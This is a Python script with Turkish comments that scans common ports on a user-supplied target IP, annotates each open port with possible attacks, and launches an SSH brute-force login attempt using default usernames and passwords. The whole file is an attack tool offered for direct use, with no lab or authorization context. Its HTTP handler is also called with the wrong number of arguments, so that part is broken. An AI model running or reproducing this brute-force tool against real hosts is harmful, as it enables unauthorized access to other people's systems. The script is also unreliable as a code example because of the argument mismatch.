import socket
import paramiko
import requests
import logging

# Log ayarları (INFO seviyesinde)
logging.basicConfig(level=logging.INFO)

# Yaygın portların açıklamaları ve hangi işlemlerin yapılabileceği bilgisi
port_info = {
    21: ("FTP (File Transfer Protocol)", "FTP üzerinden kullanıcı adı ve parola denemesi yapılabilir."),
    22: ("SSH (Secure Shell)", "SSH brute-force saldırısı yapılabilir."),
    23: ("Telnet", "Telnet bağlantısı denenebilir."),
    25: ("SMTP (Simple Mail Transfer Protocol)", "SMTP açıkları aranabilir."),
    53: ("DNS (Domain Name System)", "DNS Zone Transfer işlemi denenebilir."),
    80: ("HTTP (Hypertext Transfer Protocol)", "HTTP güvenlik taraması yapılabilir."),
    110: ("POP3 (Post Office Protocol 3)", "POP3 brute-force saldırısı yapılabilir."),
    143: ("IMAP (Internet Message Access Protocol)", "IMAP üzerinde güvenlik açıkları aranabilir."),
    443: ("HTTPS (HTTP Secure)", "SSL/TLS sertifikası kontrol edilebilir."),
    3306: ("MySQL", "MySQL brute-force saldırısı yapılabilir."),
    3389: ("RDP (Remote Desktop Protocol)", "RDP brute-force saldırısı yapılabilir."),
    8080: ("HTTP Alternatif Port", "HTTP güvenlik taraması yapılabilir.")
}

# Belirli bir IP adresi ve port numarasına bağlantı kurmayı deneyen işlev
def scan_port(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    try:
        result = sock.connect_ex((ip, port))
        if result == 0:
            return True  # Port açık
    except socket.error:
        pass  # Bağlantı hatası durumunda hiçbir işlem yapmaz
    finally:
        sock.close()  # Bağlantı her durumda kapatılır
    return False  # Port kapalı ise False döner

# SSH brute-force saldırısı gerçekleştiren işlev
def ssh_brute_force(ip):
    logging.info(f"{ip} adresinde SSH brute-force saldırısı başlatılıyor...")
    username_list = ["root", "admin", "user"]
    password_list = ["123456", "password", "admin", "root"]

    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for username in username_list:
        for password in password_list:
            try:
                ssh_client.connect(ip, port=22, username=username, password=password, timeout=2)
                logging.info(f"Başarılı giriş! Kullanıcı: {username}, Parola: {password}")
                ssh_client.close()
                return
            except paramiko.AuthenticationException:
                logging.info(f"Giriş başarısız: Kullanıcı={username}, Parola={password}")
            except paramiko.SSHException:
                logging.error("SSH bağlantısı reddedildi veya başka bir hata oluştu.")
                return
    logging.info("SSH brute-force tamamlandı; geçerli bir kullanıcı adı ve parola bulunamadı.")
    ssh_client.close()

# HTTP/HTTPS güvenlik kontrolü (durum kodu kontrolü)
def http_security_check(ip, port):
    protocol = "https" if port == 443 else "http"
    url = f"{protocol}://{ip}:{port}"
    try:
        response = requests.get(url, timeout=3)
        logging.info(f"{url} sayfasının durum kodu: {response.status_code}")
        if response.status_code == 200:
            logging.info("Sayfa erişilebilir durumda. Güvenlik taraması yapılabilir.")
        else:
            logging.warning("Sayfa durumu normal değil.")
    except requests.RequestException as e:
        logging.error(f"{url} sayfasına erişim başarısız: {e}")

# Açık portlarda tanımlı işlemleri çalıştırmak için sözlük yapılandırması
port_handlers = {
    22: ssh_brute_force,
    80: http_security_check,
    8080: http_security_check,
    443: http_security_check,
}

# Açık portlarda tanımlı işlemleri çalıştıran işlev
def handle_open_port(ip, port):
    handler = port_handlers.get(port)
    if handler:
        handler(ip)  # Sözlükte tanımlı olan işlemi çalıştır
    elif port == 3306:
        logging.info("MySQL brute-force saldırısı yapılabilir. (Bu işlev şu an için eklenmemiştir.)")
    elif port == 3389:
        logging.info("RDP brute-force saldırısı yapılabilir. (Bu işlev şu an için eklenmemiştir.)")
    else:
        logging.info(f"{port_info[port][0]} portu açık ancak bu örnekte tanımlı bir işlem yok.")

# IP adresindeki yaygın portları tarayıp açık olan portları açıklayan ve işlem yapan işlev
def explain_ports(ip):
    logging.info(f"{ip} adresindeki yaygın portları tarıyoruz...\n")
    for port, (description, action) in port_info.items():
        is_open = scan_port(ip, port)
        if is_open:
            logging.info(f"Port {port}: Açık - {description}. {action}")
            handle_open_port(ip, port)
        else:
            logging.info(f"Port {port}: Kapalı - {description}")

# Kullanıcıdan IP adresi alarak port tarama işlemini başlatan ana işlev
def main():
    ip_address = input("Hedef IP adresini girin: ")
    explain_ports(ip_address)

# Program başlatıldığında ana işlevi çalıştırır
if __name__ == "__main__":
    main()
